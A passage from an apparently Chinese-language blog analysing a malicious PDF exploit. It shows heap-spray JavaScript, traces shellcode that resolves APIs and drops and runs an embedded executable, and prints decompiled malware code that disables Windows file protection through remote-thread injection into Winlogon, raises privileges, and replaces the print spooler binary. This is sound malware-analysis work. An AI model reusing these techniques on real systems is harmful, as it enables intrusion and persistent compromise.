字符无实际作用，估计用于免杀</span></span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到上面代码首先是构造一个链条</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> nop_chip = <span class="built_in">unescape</span>(<span class="string">&quot;\x25\x750c0c\x25\x750c0c&quot;</span>);</span><br><span class="line"><span class="comment">// 65536 等于 0x10000 等于 2 ^ 16 等于 64KB, 这里的 20+8 应该是用来免杀用的，无实际作用</span></span><br><span class="line"><span class="keyword">while</span> (nop_chip.<span class="property">length</span> + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">65536</span>)</span><br><span class="line">    nop_chip += nop_chip;</span><br></pre></td></tr></table></figure></div>
+
+<p>上述代码可以近似看作拼接大量<code>nop</code>指令，然后精准堆喷，这里截取一下构造链条，使得<code>shellcode</code>能被存放在0x****0c0c,这里减去0x24，是因为堆头部会占据0x20字节，然后shellcode首部添加了4个‘A’</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 精准堆喷，使 shellcode 开始的地方一定在 0c0c 结尾的地址 0x....0c0c 处</span></span><br><span class="line">temp_chip = nop_chip.<span class="title function_">substring</span>(<span class="number">0</span>, (<span class="number">0x0c0c</span> - <span class="number">0x24</span>) / <span class="number">2</span>);</span><br><span class="line">temp_chip += shellcode; <span class="comment">//拼接上 shellcode，该位置一定在 0c0c 结尾的地址处</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/472309f790529822ae6a110992ca7bcb0b46d49b.jpg"
+                     
+                ></p>
+<h2 id="7-恶意样本分析"><a href="#7-恶意样本分析" class="headerlink" title="7.恶意样本分析"></a>7.恶意样本分析</h2><p>已经完成了样本分析过程，接下来看看恶意代码的调试分析，首先是调试界面，之前使用的分析样本是简单的执行一个计算器的打印，但是这里拿真正的恶意样本来进行分析，名字是一个名企面试自助手册<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/0b55b319ebc4b745d9899cdc8afc1e178b8215de.jpg"
+                     
+                ></p>
+<p>此时像之前漏洞分析一样直接运行到恶意代码处，这里是call了一个值，步入查看</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/48540923dd54564ed271cff3f6de9c82d0584fe7.jpg"
+                     
+                ></p>
+<p>恶意代码会从 <code>kernel32.dll</code> 中获取想要调用的函数地址。首先获取了<code> kernel32.dll</code> 的基地址，0x4930044 处先赋值 <code>ecx</code> 为 0x30 ，fs[0x30] 处即为进程环境块<code> PEB</code> 的指针，通过 PEB + 0xC 偏移处获取<code>PEB_LDR_DATA</code> 结构体指针，<code>PEB_LDR_DATA</code> 偏移 0x1C 处获取<code>InInitializationOrderModuleList</code>成员指针，<code>lods [esi] </code>获取双向链表当前节点的后继指针, 指向<code> kernel32.dll</code> 节点，找到属于<code>kernel32.dll</code>的结点后，在其基础上再偏移0x08就是<code>kernel32.dll</code>在内存中的加载基地址。获取加载基地址为 0x7C800000 ，保存在 <code>ebx</code> 中，如下图：<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/4034970a304e251fc182cf32e286c9177e3e5386.jpg"
+                     
+                ></p>
+<p>而上图中即将压入栈的0xC是即将寻找的函数数量，而上图中会运行到一个call函数，步入如下：<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/738b4710b912c8fca5afdd07b9039245d788219f.jpg"
+                     
+                ></p>
+<p>栈上第一个参数是第一个函数的hash，第二个为<code>kernel32.dll</code>的基地址，然后0x49302f8地址指令会将该基地址偏移0x3c的值赋给<code>eax</code>，这个0x3c是PE头部偏移量的存储位置，在PE头部偏移0x78处，也就是<code>kernel32.dll</code>导出表的虚拟地址0x262c赋值给<code>edx</code><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/1c950a7b02087bf4ca527c23b7d3572c10dfcfba.jpg"
+                     
+                ></p>
+<p>此时<code>edx</code>是存放着<code>kernel32.dll</code>导出表的虚拟地址的,再将偏移0x18和0x20的值分别存放在<code>ecx</code>和<code>ebx</code>中，这里的偏移分别保存着导出表函数的数目和导出表函数名称表的地址偏移</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/6a63f6246b600c3361d7f5025f4c510fd8f9a14a.jpg"
+                     
+                ></p>
+<p>然后继续单步，发现在0x493030F,这里是将函数表中最后一个函数名称地址放入<code>esi</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/7a899e510fb30f24c604c7c98d95d143ac4b0359.jpg"
+                     
+                ></p>
+<p>可以看到上面放入<code>esi</code>的函数名是<code>IstrenW</code>,然后我们在0x493031B处根据函数名计算hash，然后同之前我们压栈的hash([esp + 0x14])进行比较，若相同则继续往下走<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/fcfaaf51f3deb48fa3fb8a14b51f3a292cf5786d.jpg"
+                     
+                ></p>
+<p>然后我们在<code>cmp</code>那里下一个条件断点，免得一直循环，我们选择<code>conditional</code>这条，然后条件写<code>esp == [esp+ 0x14]</code>,然后F9<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/d6ca7bcb0a46f21f5fc47599b3246b600d33ae0c.jpg"
+                     
+                ></p>
+<p>可以看到专门存放函数名的<code>esi</code>，此时是<code>ExitThread</code>，说明我们要寻找的函数就是他</p>
+<ol>
+<li>先在导出表偏移 0x24 处获取输出序号数组的地址</li>
+<li>通过输出序号数组获取<code>ExitThread</code>函数的序号，其中 ECX 就是序号</li>
+<li>获取函数地址数组</li>
+<li>根据序号在函数地址数组中找到<code>ExitThread</code>函数的地址，保存在 <code>eax</code> 中，可以看到下图此时 <code>eax</code> 已经指<code>ExitProcess</code> 函数，猜测在实际中，<code>ExitThread </code>函数即为<code>ExitProcess</code>函数<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/d62a6059252dd42ac7d72a61463b5bb5c8eab81a.jpg"
+                     
+                ></li>
+</ol>
+<p>然后执行到这里会将其存放在[edi+ecx*4-0x4],</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">04930063    59              pop ecx</span><br><span class="line">04930064    89448F FC       mov dword ptr ds:[edi+ecx*4-0x4],eax   ; kernel32.ExitProcess</span><br><span class="line">04930068  ^ E2 EE           loopd short 04930058</span><br></pre></td></tr></table></figure></div>
+
+<p>接下来接着循环，此时的<code>ecx</code>存放着要解析的函数数目，这里可以看到将<code>eax</code>指向的函数指针保存在内存中某个位置，同样在此处下一个条件断点，条件为<code>ecx == 1</code>,然后F9，此时执行完毕会发现对应内存填充了函数地址<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/d8f9d72a6059252d393237ce719b033b5ab5b9d7.jpg"
+                     
+                ></p>
+<p>调用<code>GetFileSize</code>函数，若发现其大于，此处会一直遍历所有<code>handler</code>并获取文件大小，比较是否大于 0x2000，如果大于则跳转到 0x493008F。在此处下个断点，然后运行查看<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/6159252dd42a2834dbd41cc11eb5c9ea14cebf8e.jpg"
+                     
+                ></p>
+<p>(这里出了个问题，就是之前用计算器简单脚本所执行的iso88591没清理干净，导致运行始终不如意，这里我恢复虚拟机快照后重新编译了一遍，此时其他的基本没变，只是我们恶意代码的基地址变了一下这里底下才是正确的返回值)</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/2fdda3cc7cd98d10172926fb643fb80e7aec907e.jpg"
+                     
+                ></p>
+<p><code>esi</code>指向的句柄为0x310，指向的<code>eax</code>为文件大小，为0x1CAD74，然后点击上面的H来查看一下内存中存在的句柄，可以发现恰好就是恶意文件pdf</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/21a4462309f7905241e96df449f3d7ca7acbd502.jpg"
+                     
+                ></p>
+<p>接下来调用函数<code>SetFRilePointer</code>，将函数指针偏移到文件0x1200的位置，这里就不逐步查看了，直接往下走，调用<code>ReadFile</code>函数，读取该位置8字节到栈上0x0c0c0cFc<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/c995d143ad4bd113fa129df81fafa40f4afb0518.jpg"
+                     
+                ></p>
+<p>检查一下几点固定值，若相等，则确定为恶意文件本身，然后调用<code>GlobalAlloc</code>函数，从堆中分配一定的字节，然后填充0，大小为之前获得的那个值，分配好空间后，再次调用<code>readFile</code>将恶意pdf读入内存中<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/35a85edf8db1cb1372a616d99854564e93584b28.jpg"
+                     
+                ></p>
+<p>读出来后，使用异或解密 PDF 中的一个 stream 流对象<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/faedab64034f78f066308f393c310a55b2191cc4.jpg"
+                     
+                ></p>
+<p>解密后可以看到标红这里有一个<code>svrhost.exe</code>字符串，他被拼接到右边栈0x0c0c0B40的临时目录地址上，调用<code>lcreate</code>函数来创建该临时文件，如下<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/b64543a98226cffc853caa78fc014a90f703eae2.jpg"
+                     
+                ></p>
+<p>直接步过，然后到相应文件夹下查看<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/37d12f2eb9389b5050faf598c035e5dde6116ef6.jpg"
+                     
+                ></p>
+<p>可以看到确实有这个文件了，交换前0x200个字节，使前 200 字节恢复成正常的 PE 文件格式，然后调用 <code>lwrite </code>函数把解密后的 PE 文件写进 <code>svrhost.exe</code> 中<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/2934349b033b5bb538ba353473d3d539b700bc8f.jpg"
+                     
+                ></p>
+<p>调用<code>WinExec</code>函数进行执行该可执行文件，将他复制一份到IDA中打开<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/f7246b600c33874409eb39b6140fd9f9d62aa0ca.jpg"
+                     
+                ></p>
+<p>IDA反编译得到下面main函数</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// edi</span></span><br><span class="line">  HANDLE FileA; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// eax</span></span><br><span class="line">  HANDLE v12; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> (__stdcall *v14)(LPCSTR, LPCSTR, DWORD); <span class="comment">// edi</span></span><br><span class="line">  CHAR CmdLine[<span class="number">1021</span>]; <span class="comment">// [esp+18h] [ebp-728h] BYREF</span></span><br><span class="line">  __int16 v16; <span class="comment">// [esp+415h] [ebp-32Bh]</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [esp+417h] [ebp-329h]</span></span><br><span class="line">  CHAR Filename[<span class="number">257</span>]; <span class="comment">// [esp+418h] [ebp-328h] BYREF</span></span><br><span class="line">  __int16 v19; <span class="comment">// [esp+519h] [ebp-227h]</span></span><br><span class="line">  <span class="type">char</span> v20; <span class="comment">// [esp+51Bh] [ebp-225h] BYREF</span></span><br><span class="line">  CHAR v21[<span class="number">257</span>]; <span class="comment">// [esp+51Ch] [ebp-224h] BYREF</span></span><br><span class="line">  __int16 v22; <span class="comment">// [esp+61Dh] [ebp-123h]</span></span><br><span class="line">  <span class="type">char</span> v23; <span class="comment">// [esp+61Fh] [ebp-121h] BYREF</span></span><br><span class="line">  CHAR Buffer[<span class="number">257</span>]; <span class="comment">// [esp+620h] [ebp-120h] BYREF</span></span><br><span class="line">  __int16 v25; <span class="comment">// [esp+721h] [ebp-1Fh]</span></span><br><span class="line">  <span class="type">char</span> v26; <span class="comment">// [esp+723h] [ebp-1Dh]</span></span><br><span class="line">  CPPEH_RECORD ms_exc; <span class="comment">// [esp+728h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(Buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(Buffer));</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  v26 = <span class="number">0</span>;</span><br><span class="line">  GetSystemDirectoryA(Buffer, <span class="number">0x104</span>u);</span><br><span class="line">  v3 = &amp;v23;</span><br><span class="line">  <span class="keyword">while</span> ( *++v3 )</span><br><span class="line">    ;</span><br><span class="line">  <span class="built_in">strcpy</span>(v3, <span class="string">&quot;\\setup\\&quot;</span>);</span><br><span class="line">  v5 = &amp;v23;</span><br><span class="line">  <span class="keyword">while</span> ( *++v5 )</span><br><span class="line">    ;</span><br><span class="line">  <span class="built_in">strcpy</span>(v5, <span class="string">&quot;hid128.log&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v21, <span class="number">0</span>, <span class="keyword">sizeof</span>(v21));</span><br><span class="line">  v22 = <span class="number">0</span>;</span><br><span class="line">  v23 = <span class="number">0</span>;</span><br><span class="line">  GetSystemDirectoryA(v21, <span class="number">0x104</span>u);</span><br><span class="line">  v7 = &amp;v20;</span><br><span class="line">  <span class="keyword">while</span> ( *++v7 )</span><br><span class="line">    ;</span><br><span class="line">  <span class="built_in">strcpy</span>(v7, <span class="string">&quot;\\cmd.exe&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(CmdLine, <span class="number">0</span>, <span class="keyword">sizeof</span>(CmdLine));</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">sprintf</span>(CmdLine, <span class="string">&quot;%s /c echo 12345&gt;%s&quot;</span>, v21, Buffer);<span class="comment">// 格式化输出</span></span><br><span class="line">                                                <span class="comment">// C:\WINDOWS\system32\cmd.exe /c echo 12345&gt;C:\WINDOWS\system32\setup\hid128.log</span></span><br><span class="line">  WinExec(CmdLine, <span class="number">0</span>);</span><br><span class="line">  Sleep(<span class="number">0xBB8</span>u);</span><br><span class="line">  FileA = CreateFileA(Buffer, <span class="number">0x80000000</span>, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">3u</span>, <span class="number">0x10000080</span>u, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( FileA == (HANDLE)<span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    CloseHandle(FileA);</span><br><span class="line">    v10 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v10 )</span><br><span class="line">    sub_402180();                               <span class="comment">// 关闭文件保护函数</span></span><br><span class="line">  <span class="built_in">memset</span>(Filename, <span class="number">0</span>, <span class="keyword">sizeof</span>(Filename));</span><br><span class="line">  v19 = <span class="number">0</span>;</span><br><span class="line">  v20 = <span class="number">0</span>;</span><br><span class="line">  GetModuleFileNameA(<span class="number">0</span>, Filename, <span class="number">0x104</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !sub_402210(Filename) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_40321D(<span class="string">&quot;Not configed, exit...\r\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = CreateFileA(Buffer, <span class="number">0x80000000</span>, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">3u</span>, <span class="number">0x10000080</span>u, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v12 == (HANDLE)<span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    CloseHandle(v12);</span><br><span class="line">    v13 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v13 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  GetSystemDirectoryA(::Buffer, <span class="number">0x104</span>u);</span><br><span class="line">  *(_WORD *)&amp;::Buffer[<span class="built_in">strlen</span>(::Buffer)] = <span class="number">92</span>;</span><br><span class="line">  <span class="built_in">strcat</span>(::Buffer, <span class="string">&quot;spoolss.dll&quot;</span>);</span><br><span class="line">  GetSystemDirectoryA(byte_4127E8, <span class="number">0x104</span>u);</span><br><span class="line">  *(_WORD *)&amp;byte_4127E8[<span class="built_in">strlen</span>(byte_4127E8)] = <span class="number">92</span>;</span><br><span class="line">  GetSystemDirectoryA(byte_4128F0, <span class="number">0x104</span>u);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_4128F0, <span class="string">&quot;\\Setup\\&quot;</span>);</span><br><span class="line">  GetSystemDirectoryA(byte_4129F8, <span class="number">0x104</span>u);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_4129F8, <span class="string">&quot;\\catroot\\&quot;</span>);</span><br><span class="line">  <span class="built_in">strcat</span>(ExistingFileName, byte_4127E8);</span><br><span class="line">  <span class="built_in">strcat</span>(ExistingFileName, aSpoolsvExe);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_412C08, byte_4127E8);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_412C08, aSpoolerExe);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_412D10, byte_4128F0);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_412D10, aSetjupryExe);</span><br><span class="line">  <span class="built_in">strcat</span>(NewFileName, byte_4128F0);</span><br><span class="line">  <span class="built_in">strcat</span>(NewFileName, aFxjssocmExe);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_412F20, byte_4127E8);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_412F20, aMsxml0rDll);</span><br><span class="line">  <span class="built_in">strcat</span>(FileName, byte_4127E8);</span><br><span class="line">  <span class="built_in">strcat</span>(FileName, aMsxml0Dll);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_413130, byte_4128F0);</span><br><span class="line">  <span class="built_in">strcat</span>(byte_413130, aMsxm32Dll);</span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">0</span>;</span><br><span class="line">  sub_401FA0(ServiceName);</span><br><span class="line">  dword_413234 = sub_401A00(byte_413130);</span><br><span class="line">  <span class="keyword">if</span> ( dword_413234 )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = (<span class="type">void</span> (__stdcall *)(LPCSTR, LPCSTR, DWORD))MoveFileExA;</span><br><span class="line">    MoveFileExA(ExistingFileName, byte_412C08, <span class="number">3u</span>);</span><br><span class="line">    CopyFileA(NewFileName, ExistingFileName, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sub_401000(ExistingFileName, (<span class="type">int</span>)aMsxml0rDll, (<span class="type">int</span>)aEntrypoint) == <span class="number">1</span> )</span><br><span class="line">      sub_40321D(<span class="string">&quot;Install Again Successfully!\r\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      sub_40321D(<span class="string">&quot;Install Again Failed!\r\n&quot;</span>);</span><br><span class="line">    sub_401CE0(ExistingFileName, ::Buffer);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    CopyFileA(ExistingFileName, NewFileName, <span class="number">0</span>);</span><br><span class="line">    v14 = (<span class="type">void</span> (__stdcall *)(LPCSTR, LPCSTR, DWORD))MoveFileExA;</span><br><span class="line">    MoveFileExA(ExistingFileName, byte_412C08, <span class="number">3u</span>);</span><br><span class="line">    CopyFileA(NewFileName, ExistingFileName, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sub_401000(ExistingFileName, (<span class="type">int</span>)aMsxml0rDll, (<span class="type">int</span>)aEntrypoint) == <span class="number">1</span> )</span><br><span class="line">      sub_40321D(<span class="string">&quot;New Install Successfully!\r\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      sub_40321D(<span class="string">&quot;New Install Failed!\r\n&quot;</span>);</span><br><span class="line">    CopyFileA(ExistingFileName, byte_412D10, <span class="number">0</span>);</span><br><span class="line">    CopyFileA(::Buffer, byte_413130, <span class="number">0</span>);</span><br><span class="line">    sub_401D70(byte_4128F0, byte_4129F8);</span><br><span class="line">    sub_401CE0(ExistingFileName, ::Buffer);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401AD0(ServiceName);</span><br><span class="line">  <span class="keyword">if</span> ( sub_401A00(byte_412F20) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( sub_401A00(FileName) )</span><br><span class="line">      DeleteFileA(FileName);</span><br><span class="line">    v14(byte_412F20, FileName, <span class="number">3u</span>);</span><br><span class="line">    sub_402110(byte_412F20, &amp;unk_40B148, <span class="number">0x6E00</span>u);</span><br><span class="line">    sub_4023F0(byte_412F20);</span><br><span class="line">    <span class="keyword">if</span> ( sub_401CE0(byte_412F20, ::Buffer) )</span><br><span class="line">      sub_40321D(<span class="string">&quot;Upgrade Success!\r\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      sub_40321D(<span class="string">&quot;Upgrade Failed!\r\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_402110(byte_412F20, &amp;unk_40B148, <span class="number">0x6E00</span>u);</span><br><span class="line">    sub_4023F0(byte_412F20);</span><br><span class="line">    sub_401CE0(byte_412F20, ::Buffer);</span><br><span class="line">    sub_401CE0(ExistingFileName, ::Buffer);</span><br><span class="line">  &#125;</span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">-1</span>;</span><br><span class="line">  sub_401E20(ServiceName);</span><br><span class="line">  sub_401B70(<span class="number">4205738</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到该函数首先是创建了一个log文件，然后输出12345到其中，之后进入注释的关闭文件保护函数</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __thiscall <span class="title function_">sub_402180</span><span class="params">(<span class="type">void</span> *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  HMODULE v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 Version; <span class="comment">// ax</span></span><br><span class="line">  __int16 v3; <span class="comment">// ax</span></span><br><span class="line">  HMODULE LibraryA; <span class="comment">// eax</span></span><br><span class="line">  DWORD (__stdcall *ProcAddress)(LPVOID); <span class="comment">// esi</span></span><br><span class="line">  <span class="type">void</span> *v6; <span class="comment">// eax</span></span><br><span class="line">  HANDLE v7; <span class="comment">// eax</span></span><br><span class="line">  DWORD ThreadId; <span class="comment">// [esp+0h] [ebp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  ThreadId = (DWORD)this;</span><br><span class="line">  sub_4016F0();                                 <span class="comment">// 提权函数，启用SeDebugPreviledge</span></span><br><span class="line">  sub_401780(<span class="string">&quot;Winlogon.exe&quot;</span>);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  Version = GetVersion();</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)Version == <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = HIBYTE(Version);</span><br><span class="line">    <span class="keyword">if</span> ( !(_BYTE)v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      LibraryA = LoadLibraryA(<span class="string">&quot;sfc.dll&quot;</span>);</span><br><span class="line">LABEL_7:</span><br><span class="line">      v1 = LibraryA;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)v3 == <span class="number">1</span> || (_BYTE)v3 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      LibraryA = LoadLibraryA(<span class="string">&quot;sfc_os.dll&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_8:</span><br><span class="line">  ProcAddress = (DWORD (__stdcall *)(LPVOID))GetProcAddress(v1, (LPCSTR)<span class="number">2</span>);</span><br><span class="line">  ThreadId = <span class="number">0</span>;</span><br><span class="line">  v6 = (<span class="type">void</span> *)sub_4018B0(<span class="string">&quot;Winlogon.exe&quot;</span>);</span><br><span class="line">  v7 = CreateRemoteThread(v6, <span class="number">0</span>, <span class="number">0</span>, ProcAddress, <span class="number">0</span>, <span class="number">0</span>, &amp;ThreadId);</span><br><span class="line">  WaitForSingleObject(v7, <span class="number">0xFA0</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>函数<code>sub_4016F0()</code>是一个典型的提权函数，他的名字应该是<code>ElvatePriviledge</code>,作用是获取 <code>SeDebugPrivilege</code> 权限并设置 <code>SE_PRIVILEGE_ENABLED </code>属性来开启权限,(这里没符号表很难受,跟进查看如下)</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_4016F0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  HANDLE CurrentProcess; <span class="comment">// eax</span></span><br><span class="line">  HANDLE TokenHandle; <span class="comment">// [esp+0h] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">LUID</span> <span class="title">Luid</span>;</span> <span class="comment">// [esp+4h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">TOKEN_PRIVILEGES</span> <span class="title">NewState</span>;</span> <span class="comment">// [esp+Ch] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  CurrentProcess = GetCurrentProcess();</span><br><span class="line">  <span class="keyword">if</span> ( !OpenProcessToken(CurrentProcess, <span class="number">0x28</span>u, &amp;TokenHandle) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !LookupPrivilegeValueA(<span class="number">0</span>, <span class="string">&quot;SeDebugPrivilege&quot;</span>, &amp;Luid) )</span><br><span class="line">  &#123;</span><br><span class="line">    CloseHandle(TokenHandle);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  NewState.Privileges[<span class="number">0</span>].Luid = Luid;</span><br><span class="line">  NewState.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">  NewState.Privileges[<span class="number">0</span>].Attributes = <span class="number">2</span>;</span><br><span class="line">  AdjustTokenPrivileges(TokenHandle, <span class="number">0</span>, &amp;NewState, <span class="number">0x10</span>u, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  CloseHandle(TokenHandle);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>回到主函数，该函数会串讲停止打印服务脚本并且运行,这里会有一个字符串<code>Spooler</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/86d6277f9e2f070884b338caac24b899a801f242.jpg"
+                     
+                ></p>
+<p>用OD进行动态调试<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/8d5494eef01f3a2904b4c804dc25bc315d607cff.jpg"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://imgsrc.baidu.com/forum/pic/item/adaf2edda3cc7cd9815f29137c01213fb90e918d.jpg"
+                     
+                ></p>
+<p>可以看到会创建一个<code>Temp_unstop.bat</code>,然后我们写入内容</p>
